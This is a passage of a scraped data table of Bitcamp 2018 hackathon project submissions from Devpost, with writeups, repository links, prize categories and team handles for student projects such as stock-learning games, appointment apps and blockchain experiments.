As we were throwing together ideas, we realized a lot of companies wanted to see a project involving finance. A large aspect of finance in modern society is the stock market. It also quickly became clear how little we knew about this topic. It also sounded like a lot of other people had similar lack of knowledge in this area.  After researching for a little while, we had an idea to create an educational web app that could help the average person learn to become more comfortable choosing and investing in stock without the fear of losing their real money. The more that people are educated on the different aspects of finance, particularly stocks, the faster they can achieve financial security.

How we built it

New members can register on our site to have their information stored in the database. Once account has been created, members can easily start playing the app to ""earn"" money for their character and compete against their friends as the best stock-picker.

Challenges

The main challenge was that none of us had used MongoDB before. As we were still planning out the project, we also had to learn how to use the database software.

Accomplishment

Most of the front-end, minus a few small details, was finished in roughly 3-4 hours total.

What we learned

We learned how to use MongoDB-Stitch to provide a database for a web app.

What's next for Stock Racer

Next would be to polish out the UX till it gleams and debug the code to seamlessly pull information from real-time stock prices.
",http://www.stockracer.net,"Best Designed Investor Education Product - Finra, Best Domain Name - Domain.com, Best Financial Hack - Capital One, Best Use of MongoDB Stitch - MongoDB, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",we can move,EricMGao,robbieguy98,
ByteTheBudget,http://bitcamp2018.devpost.com/submissions/92517-bytethebudget,"Inspiration

As students, we have been put through boring types of learning in a day to day basis. We found games to be engaging and the best way for us to focus while learning. So we believed this application was an attempt to gamify learning about money management to make it not only entertaining for students but of people of all ages.

What it does

It's a clicking based learning game for money management. It gives player case scenarios as they make money in which they have to see where to carefully spend their money.

How we built it

We used html/css to build the front end of it. MongoDB was the backend in which we stored data for case scenarios and user info. Javascript and Jquery were used for the mechanics of the game.

Challenges we ran into

MongoDB was a true challenge to use. As well as web programming as this was the first time 3 out of the 4 members on the team touched something other than java.

Accomplishments that we're proud of

Honestly learning how to use and implement the database was the most satisfying achievement. Along the way, many of us also learned new languages in the web development field that can be used later at not only other hackathons but professionally.

What we learned

We learned how to use databases, web development languages and apis such as javascript,html,css,jquery. We learned how to use proper version control between four people with the use of git.

What's next for ByteTheBudget

Next step is hopefully to implement levels so player feel more of an incentive to play. This will also come with the addition of more scenarios to make it more entertaining aswell as difficulty. We will see about adding upgrades players can purchase for sense of progress. Lastly would be to balance the game fairly.
",http://bytethebudget.com/,"Best Designed Investor Education Product - Finra, Best Use of AWS - Amazon Web Services, Best Domain Name - Domain.com, Best Financial Hack - Capital One, Best Use of MongoDB Stitch - MongoDB, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,yang573,,
NextUp,http://bitcamp2018.devpost.com/submissions/92518-nextup,"Inspiration

When a healthcare physician has a cancellation, money is lost. Our product aims to fill this gap by easily making cancellations into availabilities for others.

What it does

We have a mobile iOS application that the client can leverage to request appointments on demand (like an Uber). The physicians' office will have the ability to post canceled slots for patients and also be able to set up appointments from the web app.

How we built it

We built a native iOS application using Swift. We also built a web application in Python and Flask that serves the web app along with a RESTful service that leverages web push notifications.

Challenges we ran into

Connecting the back-end to the front-end.

Accomplishments that we�۪re proud of

Making an extremely nice UI and UX. It took a lot of work, and we learned a lot.

What we learned

We learned a lot of UX and UI, and a lot of backend technologies

What�۪s next for NextUp

This coming Monday, one of our teammates will be presenting this idea to a person from industry. The idea came from a need that this guy pointed out.
",,"Best use of SparkPost API - SparkPost, Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Designed Investor Education Product - Finra, Most Futuristic Hack - Paypal, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",No,BlakeJoynes,esteininger,
Sign language to text,http://bitcamp2018.devpost.com/submissions/92519-sign-language-to-text,"Inspiration

Create a sign language interpreter.

What it does

changes ASL to text.

How I built it

Uses the leap motion to track hand motions and translate them into text. 
",https://github.com/DannyRong/bitcamp2018,,,,,
Myracle,http://bitcamp2018.devpost.com/submissions/92520-myracle,"Inspiration

We all love music, we love singing along even more

What it does

Provides lyrics for a musically interested listener to read

How we built it

We went through many APIs to see what would work. Eventually we landed on writing our own pseudo API, because API key permissions interfered with our project.

Challenges we ran into

Struggling to import software development kits
Integrating Web APIs with our software (Gracenote, APIseed, DJ Web Browser...)

Accomplishments that we're proud of

Getting it to work! :)

What we learned

The most basic fundamentals can take ridiculous amounts of time in java if the programmer is not aware of a specific solution. Design is important, but we spent a long time trying to implement very simple concepts in our code

What's next for Myracle

Audio stream fingerprint integration! Our program will recognize the audio played around the device, and then provide the user lyrics for ease of access plus adding a different realm of functionality.
",,,,John46,fuzzymohammad,
PostL8r,http://bitcamp2018.devpost.com/submissions/92521-postl8r,"Inspiration

Idea was brought out by necessity

What it does

Allows you to schedule when you want your emails to be sent to a recipient

How I built it

Python, Django, Html,css

Challenges I ran into

Learning Django in a short time, and trying to integrate other technologies with SparkPost 

Accomplishments that I'm proud of

Finishing and demoing a functional project

What I learned

A new web framework

What's next for PostL8r

Full email service? More features?
",https://github.com/Mr-Wonbot/PostL8r,Best use of SparkPost API - SparkPost,,,,
Face 2 Recommendation ,http://bitcamp2018.devpost.com/submissions/92522-face-2-recommendation,"Inspiration

Try searching ""Movies for age 25 Female/Male"" on search engine or ""Clothes for Women of age 30"" on E-commerce websites . The search results will contradicts with your query like you will see results of baby dress instead of women of age 25. This was the seed for our idea. We did research on our first day of Bitcamp for recommendations based on gender and age. We later came across a recent case study conducted in January 2018 - Face Based Advertisement Recommendation with Deep Learning: A Case Study. According to the paper a Face Based Advertisement Recommendation System (FBARS) could raise the accuracy 4 times.

How we built it

We wanted to built a recommendation system that operates on the minimal input (Age and Gender) and recommend users with movies, songs, thing to do nearby, traveling, restaurants, financial advisement. We began our data set search, it was a challenge as most of the data sets does not have the age and gender data associated. The internet connectivity was a major issue to download the datasets and analyze it. We then got a Movielens dataset that has age and gender as one of its field. We thought to make it less user entry application, so we ask user to take a selfie via our application. We then use Microsoft Cognitive Face API REST services to detect age and gender from the image.
We created a Deep Learning Neural Network based on Collaborative Filtering in python. We used the Adamax Optimizer. It is a variant of Adam based on the infinity norm.Loss function is Mean squared error. We set epoch to 300.An epoch is a measure of the number of times all of the training vectors are used once to update the weights. 
The loss values we achieved after running 300 epoch model converged at below loss,
loss: 1.6953 - age_out_loss: 0.8459 - gender_out_loss: 0.8494 - val_loss: 1.9955 - val_age_out_loss: 0.9974 - val_gender_out_loss: 0.9981
The age and gender is pass as parameter to the Neural Network Model. The model recommends the top 10 movies to the user based on age- gender and top ratings. 

Challenges we ran into

One of the major challenge we had come across was with the data collection. There are very few open source data sets available that has age and gender. We found a Movielens dataset but age field had data in high range. Due to this the distribution of the data was not uniform that affected the performance of the Deep Learning Model. We then tweaked our age data by generating age using row shuffle + random number generator based on age range.

Accomplishments that we're proud of

We implemented a proof of concept which captures your photo and detects age-gender. Based on the age-gender, recommends movies to the user.

What we learned

The facial features such as age, gender, can help us classify consumers intuitively and rapidly so that it can raise the accuracy in recommendation in a short time. Face Based Recommendation System could raise the accuracy 4 times.

What's next for Face 2 Recommendation

More squeezed Neural Network that can be deployed on iPhone or Android devices. A more robust model can be developed to recommend Clothing, Life-style, Music, Restaurants, Travel Destinations, etc.
",https://github.com/dk67604/face_recommendation,"Housing insights ���in-between�۝ Datasets - Fannie Mae, Most Futuristic Hack - Paypal, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",,RakeshBhavsar,,
Gift It: An iOS and Android Native Platform for Gifts,http://bitcamp2018.devpost.com/submissions/92523-gift-it-an-ios-and-android-native-platform-for-gifts,"Inspiration

This idea spawned off of our passion to do better at the exchange of gifts. I have always been a last minute gift buyer and I know that I can do better. Thus, Eric and I started a mobile platform to address this issue and have come to tackle and implement interesting features along the way

What it does

The application allows users to sign up and create profiles of themselves and others. You can friend people or have static profiles that represent your family and friends. Within these profiles, you can put down their interests, relevant dates associated with them, and importantly, gifts! We take all the data you give us and offer features around your gift giving desire. We have integrated Amazon, Etsy, and Ebay APIs to allow users to search and buy the gift straight within our application. To boot with a barcode scanner, see something, record it, buy it. Moreover, we also cross validate the interests you give us about your profiles to suggest relevant and trending gifts for these people. 

One major issue of gift giving is time. In order to address this issue, we have compiled a plan to serve reminders regarding upcoming dates with interesting and timely push notifications. Moreover, we've aggregated meta data of all the malls in the united states to provide geo-fenced reminders when you enter a shopping location. 

We have a budgeting tool to track what you're spending on your family and friends as well.

How we built it

We built it natively with Android Studio and Xcode.

Challenges we ran into

Resolving merge conflicts in iOS can be very troublesome. We had to make sure we were both on the right page and not conflicting with each other too much. 

Accomplishments that we're proud of

Clean, Sleek UI. The application 

What we learned

Have fun, this is a hackathon after all.

What's next for Gift It: An iOS and Android Native Platform for Gifts

We plan to continue our efforts and develop a go-to market plan.
",,"Most Futuristic Hack - Paypal, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,,,
Bunny Atsume,http://bitcamp2018.devpost.com/submissions/92524-bunny-atsume,"Inspiration

Neko Atsume is one of the greatest games in the whole wide iOS universe and I'm a first time iOS developer and wanted to replicate the game but with bunnies. 

What it does

Feed bunnies, wait for your furry companions, admire the cuteness, watch them go, buy more food, wait for your furry companions, admire the cuteness, ... etc. 

How I built it

Made using Swift 4 in xcode. 

Challenges I ran into

Learning swift and macOS

Accomplishments that I'm proud of

Learned swift and macOS

What I learned

Swift and macOS

What's next for Bunny Atsume

World domination
",,,,,,
Career-Connectzy,http://bitcamp2018.devpost.com/submissions/92525-career-connectzy,"Inspiration

Our application simply helps students reach out to employers a little easier and more efficiently to land up in a dream company. 

Being a college student, we have undergone the stress of applying for Jobs, reaching out to recruiters and passing resumes around in a career fair. Hard copies of resumes are generally collected by employers during career fairs, and it becomes a hassle handling them and tend to lose them. As we know every student could be a potential candidate and shouldn�۪t miss on the opportunity of being reviewed and called for an interview we propose Career Connectzy

Our system not just helps students but also the organizers in handling the event and helping in collecting data which would help in generating post-career fair reports and analytics. This would be a valuable source of information for the employers to target on potential candidates. 

What it does

Career Connectzy interactive proximity-based application that simplifies the entire process of reaching out to right employers during a career fair, and helps organizers/employers in generating post-event reports and analytics. 

The system deployment has three major units which work in tandem to perform these operations. 

1)  BLE Beacon Advertising Service ��� Placed at each employer�۪s booth during a fair and requires one time configuring. 

2)  Android Application (Students) ��� They get suggestions based on their profile gets to know the recruiter's contact details. If interested, he/she can shoot a follow-up email with their resume immediately

3)  Android Application (Employers) ��� Employers get to sign up and view real-time statistics about people who visited. 

4)  Backend Cloud Server ��� This server does the backend processing and updates data to a database, which can be retrieved on request based on filters.

How we built it

The application was scripted in Android Studios with Java the BLE hardware was scripted with embedded C. An Android smartphone running Android Nougat is used for deploying the application. Rest parts were configured appropriately for proper functionality. 

Resources from Hackathon
1)  Mongo DB Stich API was used for backend processing and 
2)  SPARKPOST API was used to send out emails with resume attachment to Recruiters. 
3)  MLH Hardware Lab - An open source Arduino 101from with Intel Curie libraries were used to advertise BLE packets. 
4)  MLH Hardware Lab ��� A Domain name ���CarrerConnectzy.com�۝ was registered to support profiles and sending out emails. 

Challenges we ran into

Learning and integrating MongoDB Stich took some time and was challenging. Configuring SparkPost API with Android Studios Java was interesting and time-consuming too.

Accomplishments that we're proud of

We are proud that we were able to implement our solution in the given amount of time.

What we learned

We are really happy that we learned to integrate MongoDB Stitch (Beta) and SharkPost API�۪s packages for an application in a very short period.

What's next for Career-Connectzy

We feel Career Connectzy could be a really useful application and benefit students finding right jobs and internships during college studies. This application is not limited just for career fair implementation but also for out business tech expos who wish to collect statistical data. We are interested in bringing forward this solution and venture into other possibilities in today�۪s market. 
",https://github.com/Aswinnatesh/Career-Connectzy,"Best use of SparkPost API - SparkPost, Best Designed Investor Education Product - Finra, Most Futuristic Hack - Paypal, Best Domain Name - Domain.com, Best Use of MongoDB Stitch - MongoDB, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,,,
Viper,http://bitcamp2018.devpost.com/submissions/92526-viper,"Inspiration

Jupyter Notebooks have brought data science visualization to everyone. The breadth of frameworks and modules available to python developers for data science allows anyone to analyze data, but there exists a gap when it comes time to scale your data science pipeline.

What it does

Viper is a data science platform that allows students, researchers, and scientists to easily create and scale their data pipelines. Developers can create tasks and stitch them together with our intuitive Python API to create full data science pipeline. They can test their pipeline locally and when it's time, submit a job to the Viper cloud and our infrastructure will intelligently separate their data pipeline into stages that can be run concurrently. 

Extra Compute

Viper is built upon the residual compute power that every internet connected personal computer has. When you run your pipeline, Viper shards up you work and distributes it across the network. Our advanced reduce and conquer algorithm will have your task done in no time. 

What's next for Viper

Have extra compute power? Electricity cheap and rent expensive? Have an extra computer kicking around?

Join the cluster!

A viper market place is coming soon! With this new feature, you can get paid for your extra compute power!

https://github.com/jpurviance/viper
",,,,,,
PlanetTerp Scheduler,http://bitcamp2018.devpost.com/submissions/92527-planetterp-scheduler,"Inspiration

Last November, I started a website called PlanetTerp, with the goal of creating a website that would help students at the University of Maryland ��� College Park make informed decisions. The website includes professor & TA reviews, a discussion board, grade data, and various tools.

The most common feedback I got about the website was that it was annoying to have to visit three, four, or even five different sites to create a schedule. Each website served a different purpose, and students relied on all of these websites to create their schedules. While PlanetTerp had professor/TA reviews and grade data, it did not have a scheduling feature.

This tool was designed to help students create their schedules. It allows students to input courses they want to take, and generates potential schedules for them. On the same page, students can view average professor ratings and grade data for the courses they're scheduling. Students can also click a button which will redirect them to Testudo's registration page with the registration form filled out, so they can register in just two clicks.

Another planned feature, which was not completed during this hackathon (but which will be completed in the feature), is the option for students to share their schedules with others in their GroupMe chats. Hopefully this will make it easier for students to find which courses their friends are taking, as well as to coordinate taking courses together.

Other planned features include searching for geneds that fit a student's schedule, and restricting certain times and days from a schedule.

The tool is not yet live, but once it is, it will be available on PlanetTerp.

To be clear, not all of PlanetTerp was created during this hackathon. Only this scheduling tool was created during Bitcamp.

How I built it

I built the tool using the Python web framework web.py. The tool uses MySQL to store data, and uses JavaScript, jQuery, and AJAX to make it easier to use.

Challenges I ran into

Creating an algorithm to generate all possible schedules. The algorithm still isn't perfect -- inputting many courses with many sections makes the tool take a long time to run. I'm working on improving the speed of generating schedules.
",,"Most Futuristic Hack - Paypal, Best Hack (be passionate) - Facebook",,,,
politiscribe,http://bitcamp2018.devpost.com/submissions/92528-politiscribe,"Inspiration

We are disappointed in the current state of affairs and wish that there was an easier way to get involved in politic. Campaigning is not only requires time but a lot of resources. This often put the little man at a significant disadvantage. As a result, most are discourage from even trying, so we want to build something to even the playing field.

What it does

This is a social media platform focus on the sharing of political ideas and gives the individual the direct line of communication to the people in a way that has not been possible. 

The people has a better chance of understanding and know what their current and possible future representative stands for.

How we built it

We divided our tasks based on our skill sets which allowed us to accomplish our planed goals.

Challenges we ran into

We experienced authentication issues with MongoDB stitch which slowed down our development but did not stop us. 

Accomplishments that we're proud of

We built a sturdy application, that demonstrates  our vision for this platform while still barely scratching the surface of its potential. 

What we learned

We learned how to utilized MongoDB Stitch as backend API. Used Ark Client to learn about blockchain transactions. We then learned how to utilize the Python API wrapper to use those transaction commands in python. 

What's next for politiscribe

We will continue to develop our platform and explore it potential using Blockchain technology. Our goal is to have a political social media platform that guarantee transparency.
",https://github.com/tlrwgnr/politiscribe_api,"Decentralise Everything: Blockchain challenge - Ark, Most Futuristic Hack - Paypal, Best Use of AWS - Amazon Web Services, Best Use of MongoDB Stitch - MongoDB, Best Hack (be passionate) - Facebook",No,xli28,Ishroom,
EZ-Cal,http://bitcamp2018.devpost.com/submissions/92529-ez-cal,"Inspiration

What it does

How we built it

Challenges we ran into

Accomplishments that we're proud of

What we learned

What's next for EZ-Cal
",https://github.com/chasew/EZ_Time_Bitcamp,,,samiso443,,
GeoChain,http://bitcamp2018.devpost.com/submissions/92530-geochain,"Inspiration

Satoshi

What it does

We create a network to allow smart contracts to be built upon location based data

How we built it

We built it on top of the ethereum network using solidity, and we began to develop just one of many use cases-  an IOS app written in swift that allows businesses to issue incentives/lottery rewards to users for visiting their location

Challenges we ran into

We knew nothing about the blockchain coming into this.  Teaching ourselves how to program ethereum smart contracts in under 36 hours in and of itself was a challenge.

Accomplishments that we're proud of

We are on the blockchain!

What we learned

How to write an ethereum smart contract with solidity
How a decentralized network works in general
web3
We learned some more about IOS dev

What's next for GeoChain

We plan on continuing to test and develop our platform and eventually deploy it to the live ethereum network.  We will continue to build other applications on top of our base network, and possibly create an API for other developers to integrate our technology into their stack.
We see many possible use cases for this tech in the future, some of which include:
Businesses and events driving more customers to their locations through incentive rewards
50/50 style raffles that often already occur at large events to draw more customers
Applications in online dating, and meeting people online, to create trust if you plan a meeting in the physical world
",https://rinkeby.etherscan.io/tx/0xd3d529e959fa330db30da61b430b5b229eba6d934c981890bec0bfbf18f49b77,"Decentralise Everything: Blockchain challenge - Ark, Best Hack (be passionate) - Facebook",No,,,
P2P Microfinance,http://bitcamp2018.devpost.com/submissions/92531-p2p-microfinance,"Inspiration

Last semester in our Entrepreneurship and Innovation class, we participated in an activity called the GumBall challenge. The GumBall challenge was a micro-financing activity where teams of 4 students were provided $27 and 27 gumballs and told to make as much money as they could in a week. Micro-financing was originally formulated by Muhammad Yunus, the founder of the Grameen Bank. The micro-financing scheme helps people in these third world countries build small businesses in the scope of their village by providing them with the capital to jump start their businesses. We wanted this chance to be available to more people so we came up with the idea of crowdsourcing the money required for microfinancing.

What it does

It provides a platform for people in first world countries a way to microfinance people who live in poorer nations such as India and Africa.

How we built it

We built two apps using Android Studio, and we used Firebase for data storage and user authentication.

Challenges we ran into

Authentication was an extremely difficult task to get around. Being able to create a account system for a lender who would want to use their google account and a borrower who would use their phone number was extremely challenging.

Accomplishments that we're proud of

We are proud that we were able to design a system to get around this. 

What we learned

We learned alot about NoSQL database creation

What's next for P2P Microfinance

Move the database to a blockchain ledger along with implementing actual financial transfer protocols.
",https://github.com/adharsh/P2PMicrofinanceBorrower.git,"Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",,,,
Mr. Don't Blink,http://bitcamp2018.devpost.com/submissions/92532-mr-don-t-blink,"How the team formed

We all met near the campfire site during Team Formation. I came with a friend, and the both of us are the most indecisive pair with a ton of different ideas we want to implement, so we were holding the white sticky notes for the random, just-for-fun ideas to find others who would be interested to integrate their skills to build a web application (or a VR game? Or a race car VR game?) We met another pair of people who were just as lost as to what exactly they wanted to do and negative + negative = positive! We clicked and stuck to an idea.

Inspiration

I was remembering how my dog likes to stare at me when he's bored with nothing to do, and can hold a gaze for a oddly impressive amount of time. I jokingly said that we should make a web application that can have a staring contest with you, and the more our teammates talked about it, the more we realized that everyone had a little something they wanted to contribute to the idea, and so we chose that. 

What it does

Mr. Don't Blink does visual recognition to determine whether or not the users eyes blink throughout a game against a virtual character. If the user blinks, they lose. If the character blinks, the user wins!

How we built it

We used IBM Watson's AI to first train it to recognize closed and open eyes on all of our team members faces. Then we used IBM's Cloud Confoundry to deploy our application to make it web-based. A lot of effort went into the front end design, and every success was celebrated with Damon's optimistic cheering and high fives. 

Challenges we ran into

A lot of these technologies were brand new to us, but that tends to happen at Hackathons. What was truly a challenge was managing time to give love to all parts of the project. Currently we have a fairly refined front end, but the back-end still needs to be integrated with the rest of the project. 

Accomplishments that we're proud of

The fact that the AI works and that this is our first demo!!!

What we learned

How important communication between team members is.

What's next for Mr. Don't Blink

Our application trains machines to detect minute changes in people's expressions (specifically, blinking).  This technology could be enhanced and expanded to include a variety of facial features and be used as a visual lie-detector during police interrogations, as part of a background check (along with polygraphs), or further used to study patients with mental complications.
",http://getstartednode-shiny-porcupine.mybluemix.net/,"Best Digital Forensic Hack - Cipher Tech Solutions, Using Virtual Reality Technology Design the Best Manufacturing Facility - Lockheed Martin, Most Futuristic Hack - Paypal, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",Table S4,,,
Twitter to Physical Arduino Interface,http://bitcamp2018.devpost.com/submissions/92533-twitter-to-physical-arduino-interface,"Inspiration

One of our biggest inspirations was Twitch Plays Pokemon. Ever since seeing other people controlling a single computer we have wanted to implement a similar system ourselves. With our Twitter to Arduino interface, we have been able to take a big step in achieving this goal!

What it does

Our takes tweets that tag our bot account and, if syntactically correct, translates these Tweets into commands that are passed from a Raspberry Pi to an Arduino that is acting as an I/O slave. After completing a certain task, the bot direct messages the user that sent a command, to ensure that they know the effect of their Tweet. If a user does not know the recognized commands, they can ask the bot for help, and it will direct message them with a list of the supported commands.

How we built it

Our project began with a Raspberry Pi. After reading through the Twitter API documentation, we began our search for a Python library to utilize the API. After searching, we found Tweepy and began working on recognizing when someone would Tweet to our Twitter Bot. After this, we added in multiple statements to recognize what was being Tweeted. With these Tweets, we installed the Nanpy library in order to use an Arduino as an I/O slave to our Raspberry Pi. Finally, with all of the commands inserted and bugs sorted, we are able to control and Arduino with nothing more than a Tweet!

Challenges we ran into

The Twitter API was rather difficult to work with from the get-go. With many different ambiguous errors, we were unsure whether we would be able to sort out the problems by the end. Specifically, one problem with Twitter is that it contains an anti-spam feature that will not allow a user to Tweet the same thing twice in a short time period. This made the project difficult to test at times, although we pushed through!

Accomplishments that we're proud of

When we began the hackathon, we had very low expectations for how we would perform and we ended up surpassing them! We are very proud that we were able to meet all of our expectations and produce a fully working project.

What we learned

Firstly, we learned Python! Before this project we did not know a single line of Python, and by the end we were able to make a rather difficult project using it. Additionally, we learned a lot about APIs and how to utilize them. We felt this was important because APIs are used everywhere. Finally, we learned perseverance. No matter what came up, we pushed through because we had to, and this is a skill that I believe will help us throughout our hackathon seasons.

What's next for Twitter to Physical Arduino Interface

Next up, we want to try and control an Arduino powered car, and possibly create our own version of Twitch Plays Pokemon, except with a robot instead of a Pokemon game!
",https://twitter.com/_Blink_Bot_,,No,,,
Art of Dance,http://bitcamp2018.devpost.com/submissions/92534-art-of-dance,"Inspiration

DANCE

Who doesn't love dancing (at least in private)? There's an art to dancing and we wanted to show that art from a new perspective.
The goal of this project was to combine the static art of painting with the dynamic joy that dance can express in an abstract and thought provoking way.

What it does

Art of Dance takes the beauty in movement and uses it as inspiration to create a digital color masterpiece personalized to the dancer.

How we built it

We used many different languages, each being particularly useful for a separate piece of our project. We got these to work in conjunction through data streams and server side storage. The difficult part was inventing and designing algorithms to convert the raw movement data into artistic images. We all contributed design ideas that compiled into several very different methods of displaying rhythmic movement as static art.

Challenges we ran into


Parsing the sensor data using C++ into a format easily read in to Processing to generate the artistic representations.
Accessing a pre-trained neural net API that could take our generated images and make them more artistic.
A lot of accidentally overwriting each other's code on our github repo.


Accomplishments that we're proud of


Reading raw movement data from multiple Myo devices to give a better perspective of actual movement of a dancing subject instead of interpolating movement from a single sensor.
Organizing our tasks into modular code so that we could use tech tools to encourage collaboration in artistic algorithm development.
Creating a more artistic image generation algorithm that procedurally used smoother color transitions to make an resulting artwork that seemed more professional and was easier on the eyes.


What we learned


Functional possibilities of Myo Wristband technology.
How to use technological tools to enable artistic collaboration, for example github repositories.
How to use image generation tools like processing as well as neural network APIs to explore artistic possibilities.


What's next for Art of Dance

We want to look more into training a neural network to process our images out of a mostly geometric scope into a more creative and abstract artistic perspective of beauty of motion. We would also like to look into developing our own machine learning algorithm that can detect when a particular image generation method is colorful enough and saves that as a valid option for data representation.
",https://github.com/feteru/SMEGmark,"Best use of SparkPost API - SparkPost, Most Futuristic Hack - Paypal, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",No,samslew,enorman1615,
Resume Website,http://bitcamp2018.devpost.com/submissions/92535-resume-website,"Inspiration

What it does

How I built it

Challenges I ran into

Accomplishments that I'm proud of

What I learned

What's next for Resume Website
",https://github.com/mercyspirit/ResumeBuilder.git,,,,,
Rucksac,http://bitcamp2018.devpost.com/submissions/92538-rucksac,"Inspiration

Many times people want to travel together but have to use a plethora of apps such as Splitwise, Google Maps, Whatsapp etc., to aid them in their journey. When friends want to travel together, it is required to have all these different apps which might be cumbersome. Our aim is to solve this problem by incorporating all travel related activities in a single app that would benefit all travelers. 

What it does

The app will feature trip itinerary which will include the places they plan to visit, the time at which they wish to start and will also send out reminders to all users regarding upcoming activities.  It also includes an in-app chat through which the travelers connect with each other during their journey and, share pictures and other media. Aside from chatting and itinerary features, the app also introduces wallet where each traveler can view the expenses incurred and pay the balances they owe to others during the trip. 

How we built it

Initially, in the design phase, we used Adobe XD to create and manage the screens. To provide interactivity and to understand the flow of the app, we imported the screens from Adobe XD to Marvel app and visualized the flow and direction of each screen in the app. 

The app was developed using Android Studio and Firebase.

Challenges we ran into

When we were developing the chat feature for the app, we realized that notifications weren't possible using GET and POST requests for Android versions above 6.  

Accomplishments that we're proud of

We were able to authenticate the app using Google Sign-in and create a miniature version of the chat screen without the notification. The designs of the screen and the interactivity of the different screens came out really well.

What we learned

We learned on how to use Firebase, Android Studio and Adobe XD for this app

What's next for Rucksac

We wish to make a fully functional app that includes all the features mentioned above and launch it in the playstore.
",https://marvelapp.com/44bdi7b/,"Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",No,AkshayRajaraman,,
Carify,http://bitcamp2018.devpost.com/submissions/92539-carify,"Inspiration

We were looking at the Credible's challenge and we thought that why don't we create something so that the kids under 12 years old will never get lost

What it does

It can tell whether or not if your kid (from 12 and under) is in a safe zone, and it will alert you if your kid is not in the safe zone

How I built it

We used react native, google maps api and sparkpost api

Challenges I ran into

We had a hard time implemented geofencing on google map api

Accomplishments that I'm proud of

This app is completed

What I learned

I learned how to use Node js

What's next for Carify
",,"Best use of SparkPost API - SparkPost, Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Domain Name - Domain.com, Best Hack (be passionate) - Facebook",No,,,
CrowdWings,http://bitcamp2018.devpost.com/submissions/92540-crowdwings,"Inspiration

we found, from personal experience, it is super frustrating that there is a large barrier for investments in early-stage startups. These startups required angel investing in order to make the desired impact. However, this level of funding is not available for a normal person that is just excited to invest in a new startup and wants to see this startup succeed. Marketplaces such as Kickstarter allow startups to crowdfund but do not give the crowd a stake in the company, they only provide the finished product. The investors are not part of the decision making of the company. 

What it does

The CrowdWings platform allows the crowd to not only invest in a company but also to have a meaningful impact on the company development and growth through feedback and decision making. Our company acts as a large angel investor that buys a stake in the company, and investors get a pre-screened view of startups that will most likely have a high return on investment. This way, investors are most likely to profit while involved in the decision making of the company. They will receive updates on company progress continuously. 

How I built it

CrowdWings is a Django web app hosted on Azure. Admins post startups to the page and uses are able to invest in individual startups using the PayPal API.

Challenges I ran into


Convening others to post their ideas on our platform
Hosting on a different environment on the cloud
New Industry with limited information on equity crowdfunding and government regulation


Accomplishments that I'm proud of

We were able to successfully integrate our complex system into a web app and host a live functional prototype!

What I learned

We learned about this new industry of crowdfunding equity. We also learned about UX design through multiple iterations of our interface (and Bananas!).

What's next for Crowd Wings

We will polish off the website from feedback during the demos. Then we plan to open CrowdWings up to a beta audience. Once we have a minimum viable product and real users we hope to obtain funding to quickly scale into this emerging industry.
",http://crowdwings.eastus.cloudapp.azure.com/,"Best Designed Investor Education Product - Finra, Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",,PetersonJoshua,AlexandraKemper,
YouTune,http://bitcamp2018.devpost.com/submissions/92542-youtune,"Inspiration: Blind people, Musicians

What it does: Finds out the orientation and position of fingers using leap motion and plays a sound based on it.

How I built it: We built it using the leap motion sensor, unity and C#.

Challenges I ran into: Finding out the way every finger moved and to assign a specific tone to each of them.

Accomplishments that I'm proud of: Multiple tones can be played when multiple fingers are waved. Also, it becomes fun for people with zero or little interest in making music.

What I learned: Importance of teamwork, innovation and consistent efforts.

What's next for YouTune: Configure it with Cortana or Google assistant to help physically challenged people.
",,"Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",No,granaj91,,
InvestRobo,http://bitcamp2018.devpost.com/submissions/92544-investrobo,"Inspiration

A good investment leads to a promised future

What it does

An algorithm,iOS app which allows stocks to be automatically be bought according to users deposit amount.The script to get future stock prices according to the stocks history.

How we built it

It was built using ScikitLearn,Swift for app. To accurately predict the graph we used matplotlib. 

Challenges we ran into

The algorithm was really difficult in achieving, there was difficulties in learning already available resources related to our projects. The iOS app gave many errors throughout development.

Accomplishments that we're proud of

Project as an whole. The project was a result of endless hours and sleepless nights. It is just how we imagined.

What we learned

We learned ScikitLearn and matplotlib in order to achieve the algorithm.

What's next for InvestRobo

To build upon the Graphical User Interface.
",https://github.com/vardhanpatel/InvestRobo,"Best Financial Hack - Capital One, Most Unique Hack - 1517 Fund",No,jonathanconn29,,
VocalLearn,http://bitcamp2018.devpost.com/submissions/92545-vocallearn,"Inspiration

What it does

Voice flashcards

How we built it

Challenges we ran into

Accomplishments that we're proud of

What we learned

What's next for VocalLearn
",https://github.com/christian-rncl/VocaLearn,"Best Use of AWS - Amazon Web Services, Best Domain Name - Domain.com, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",,shane-miller,,
One Percent Closer,http://bitcamp2018.devpost.com/submissions/92548-one-percent-closer,"This app will track your bank transactions and round up to the nearest dollar, donating your spare change to charities of your choice automatically.
",http://54.237.223.80:3000/,"Best Financial Hack - Capital One, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook",,,,
Hospital Databases,http://bitcamp2018.devpost.com/submissions/92573-hospital-databases,"Inspiration

